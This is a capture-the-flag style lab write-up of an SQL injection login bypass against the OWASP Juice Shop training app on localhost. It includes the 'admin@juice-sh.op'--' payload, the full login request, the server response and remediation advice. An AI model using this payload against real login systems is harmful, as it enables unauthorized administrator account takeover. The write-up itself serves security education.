# Lab Writeup 3: Administrator Account Takeover via SQL Injection

**Category:** Injection (SQLi)  
**Difficulty:** Beginner  
**Date Completed:** 29/03/2026  
**Platform:** OWASP Juice Shop  
**Lab URL:** http://localhost:3000

---

## 1. Objective

Successfully execute an Authentication Bypass attack using SQL Injection on the login portal to force the database to authenticate as the Administrator without requiring a valid password.

---

## 2. Vulnerability Overview

**Vulnerability Name:** SQL Injection (Authentication Bypass)

**CWE Reference:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

**OWASP Category:** A03:2021 – Injection

**What is this vulnerability?**

SQL Injection occurs when user-supplied input is directly concatenated into a backend SQL database query without sanitization or parameterization. This allows an attacker to manipulate the structure of the executed query. By injecting specific characters (like a single quote `'`), an attacker can terminate the intended query string and inject logical operators to arbitrarily evaluate the authentication check to "TRUE". 

---

## 3. Reconnaissance & Discovery

During initial testing of authentication mechanisms:

**Initial Exploration:**
- Attempted to submit standard single quotes (`'`) into the email field of the login portal to observe the application's response to unexpected metacharacters.
- Monitored the HTTP response codes and error messages.

**The "Aha!" Moment:**
When passing `'` into the login field, the application unexpectedly behaved strangely, returning a 500 Internal Server Error, strongly indicating that the backend database choked on the syntax. The login page was susceptible to Boolean/Error-based SQL testing logic.

**Tool(s) Used:** Burp Suite Community Edition

---

## 4. Exploitation Steps

### Step 1: Craft the Payload

To log in as the Administrator, I needed a payload that would close the email string, comment out the remainder of the password verification query, and return the first matched database row (which is typically the Admin).
- **Target Email:** `admin@juice-sh.op`
- **Injection:** `'--` (Closes the string and adds a SQL comment)
- **Final Payload:** `admin@juice-sh.op'--`

### Step 2: Send the Request in Burp Suite

Logged into Burp Suite, navigated to the login endpoint, and submitted the crafted payload inside the JSON body. 

**Request:**
```http
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Connection: close

{
  "email": "admin@juice-sh.op'--",
  "password": "arbitrary_random_text_here"
}
```

### Step 3: Analyze the Server Logic and Response

The backend concatenated the strings into an unsecured SQL query that looked like this:
```sql
SELECT * FROM Users WHERE email = 'admin@juice-sh.op'--' AND password = 'arbitrary_random_text_here'
```
Because `--` comments out the rest of the query, the `AND password = ...` clause was completely ignored.

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 412
Connection: close

{
  "authentication": {
    "umail": "admin@juice-sh.op",
    "role": "admin",
    "id": 1
  },
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIj..."
}
```

**Success!** The application instantly authenticated me as the Administrator and provided a fully-privileged JWT token.

---

## 5. Root Cause Analysis

The root cause of this vulnerability involves the failure to use modern secure coding practices when communicating with databases.

**What the API Does:**
1. ❌ **FAILS** to parameterize inputs.
2. Formats a raw, unescaped dynamic string and feeds it directly into the SQL engine.

**What the API Should Do:**
The query should be executed using parameterized statements (Prepared Statements), which treat user input strictly as data and prevent it from being parsed as executable code logic:
```javascript
// Pseudocode - The Fix
const sql = 'SELECT * FROM Users WHERE email = ? AND password = ?';
db.execute(sql, [req.body.email, hashed_password]); 
```

---

## 6. Impact

- [x] Complete Account Takeover
- [x] Administrative System Compromise

**Severity:** Critical

**Justification:** Bypassing authentication to compromise the highest privilege account (Administrator) immediately relinquishes total control of the system to the attacker. They gain full read/write access over the database and configuration logic.

---

## 7. Remediation

1. **Use Prepared Statements:** Defend against SQL Injection inherently by migrating to Prepared Statements / Parameterized Queries.
2. **Utilize ORMs:** Adopt robust Object-Relational Mapping (ORM) frameworks like Sequelize or Prisma, which handle parametrization gracefully by default.
3. **Input Sanitization:** As a secondary defense-in-depth layout, reject input containing illegal character sequences at the WAF or Middleware layer.

---

## 8. Key Takeaways / What I Learned

- **Never Trust User Data:** Any input spanning from HTTP headers to JSON body fields must be treated as hostile code.
- **SQLi Remains Relevant:** Even with modern frameworks, inline queries can slip through causing devastating bypass scenarios.
